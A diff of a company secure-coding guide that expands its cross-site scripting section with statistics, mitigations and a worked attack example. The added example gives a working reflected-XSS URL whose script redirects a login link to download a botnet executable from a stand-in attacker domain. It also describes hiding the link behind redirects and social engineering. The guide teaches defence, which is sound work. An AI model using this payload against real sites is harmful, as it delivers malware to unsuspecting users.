@@ -1,7 +1,7 @@
-Best Practices for Web App Security
+Originate Guides - Best Practices for App Security
 ========================
 
-Hello! This document will give a general guideline on best practices in building a secure web application as well as list and describe commonly used web application exploits and how to defend against them.
+Hello! This document will give a general guideline on best practices in building a secure application as well as list and describe commonly used application exploits and how to defend against them.
 
 First and foremost, **always enable HTTPS when in production!** It doesn't matter how well written and secure the code is if an attacker can just man-in-the-middle the connection and steal session cookies or inject malicious code.
 
@@ -26,21 +26,38 @@ HTTPS Guidelines
 
 **Cross Site Scripting (XSS)**
 
-XSS is a vulnerability in a web application that allows an attacker to inject client-side scripts (usually Javascript) into webpages that can be viewed by other users. At best, the website gets defaced. At worst, session cookies are stolen, accounts get hijacked, and the browser turns into a [zombie](http://www.pcworld.com/article/2045944/researcher-builds-botnetpowered-distributed-file-storage-system-using-javascript.html). It is extremely prevalent and, according to Symantec, accounted for 84% of all web vulnerabilities in the last six months of 2007.
+XSS is a vulnerability in a web application that allows an attacker to inject client-side scripts (usually Javascript) into webpages that can be viewed by other users. At best, the website gets defaced. At worst, session cookies are stolen, accounts get hijacked, and the browser turns into a [zombie](http://www.pcworld.com/article/2045944/researcher-builds-botnetpowered-distributed-file-storage-system-using-javascript.html). It is still a prevalent attack in 2015, and according to a report by [whitehatsec](http://info.whitehatsec.com/rs/whitehatsecurity/images/statsreport2014-20140410.pdf) as of 2014 it is a significant issue across all languages. Some notable examples include:
+
+ - Java (Web Applications): 57% of Java web app vulnerabilities are XSS
+ - Perl (CGI): 67% of Perl web app vulnerabilities are XSS
+ - PHP: 56% of PHP web app vulnerabilities are XSS
+ - ASP: 49% of ASP web app vulnerabilities are XSS
 
 **Non-Persistent**
 
-Non-persistent XSS occurs when the server echos back raw user input immediately after it's submitted. This usually happens on insecure search pages that contain the search query the user made. For example, if a user searched for ```<script>alert(0)</script>``` and the search page contains ```Found 0 results for _%userQuery%_``` where ```_%userQuery%_``` is the search query, then the script tags will be injected directly into the DOM and executed by the browser.
+Non-persistent XSS is the single most commonly performed XSS attack to date.
 
-Possible Attack Vector
+Non-persistent XSS is carried out by getting a website to execute attacker-controlled code on the victim's browser. For this reason it is also known as "reflected XSS", because the site simply reflects the attacker-controlled code onto the user's browser. Non-persistent XSS is different than other forms of XSS in that non-persistent XSS does not store the payload anywhere. It is sent without the user knowing (usually through a doctored URL) and the payload is returned in the HTML response.
 
-- Attacker crafts a URL with the malicious search query (ie. ```http://search.com/?q=<script> /*malicious javascript*/ </script>```)
-- Attacker sends the URL to an administrator or posts it somewhere online
-- All the victim(s) has to do is click the link to have the malicious code executed
+Typically a hacker will test the site for vulnerabilities with a fuzzer, or by hand testing various exposed parameters by manually trying to inject an alert such as `<script>alert("XSS works >:D");</script>`. Once the attacker has a working vector, a crafted URL can be made and masked using redirects on a site they control. From there, they can send the link (ex. "http://meet-singles-now.ru") and use social engineering to get a user to click on it. This is *very* common in modern spam, and is often time consuming to perform analysis on when it happens because the victim will likely not believe a site that "looks normal" could have attacked them.
+
+Possible Attack Vectors
+
+- Any site that is using endpoints with GET parameters that are inserted directly into the DOM is vulnerable to non-persistent XSS
+
+Example Attack
+
+In the below example, we will override an enticing link on a site we have determined to be vulnerable to download our botnet client. We will focus on attacking a Windows computer (because of the \*.exe), but a similar attack could be done on any system. Suppose the second link on the mysite login page is the login button. The exploited code shown below will download our botnet client to the user's computer. Since we're dealing with Windows in this example, we can add some additional testing code (not shown below) to test for common download locations on the users computer using ActiveX, and then use the Run method to run the executable.
+
+- Normal: `http://mysite.com/login.php?username=angrygoats&startPage=1`
+- Exploited: `http://mysite.com/login.php?username=<script>window.onload=function(){var mylinks=document.getElementsByTagName("a");mylinks[1].href="http://meet-singles-now.ru/flash_playerupdate.exe";}</script>`
 
 Mitigation
 
-- Don't output un-encoded user input. Sanitize potentially dangerous user-given data by html encoding it before placing it in the DOM.
+- Always assume every parameter could be potentially compromised and validate accordingly
+- Make sure to HTML encode any output to the screen, this way any tags that are displayed will be safe
+- Regularly run web vulnerability scanners such as [Acunetix](http://www.acunetix.com/vulnerability-scanner/download/)
+
 
 **Persistent**
 
@@ -249,7 +266,7 @@ Here are some tips and best practices in securing the project you're working on 
 - Use strong passwords
   - Preferably randomly generated with letters, numbers, and other characters
 - Try not to use public personal information to secure anything (i.e. using your dog's name as the answer to a secret question and your dog's name is on Facebook)
-  - Don't assume information about your personal life or relationships is private enough to only be known by you. It's 2014.
+  - Don't assume information about your personal life or relationships is private enough to only be known by you. It's 2016.
   - Do not talk about the specifics of a project on social media. Improper disclosure of technologies used may give an attacker enough information to exploit it.
   - If you own a domain name, purchase [whois protection](https://en.wikipedia.org/wiki/Domain_privacy). Whois records are a publically accessible treasure trove of personal information that includes your name, address, and phone number.
   - See the “Recon Tools” section below and see how much personal information you can dig up about yourself.
@@ -265,7 +282,7 @@ Web Application Penetration Testing Tools
 - Pentesting Suites
   - [Burp Suite](http://portswigger.net/burp/)
   - [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)
-  - Both Burp and ZAP are pretty identical in their feature sets – and there are a lot. The most useful feature though would probably be the proxy that lets you view and modify data sent between the client and server in real time. 
+  - Both Burp and ZAP are pretty identical in their feature sets – and there are a lot. The most useful feature though would probably be the proxy that lets you view and modify data sent between the client and server in real time.
 
 - SQL Injection
   - [sqlmap](http://sqlmap.org/)
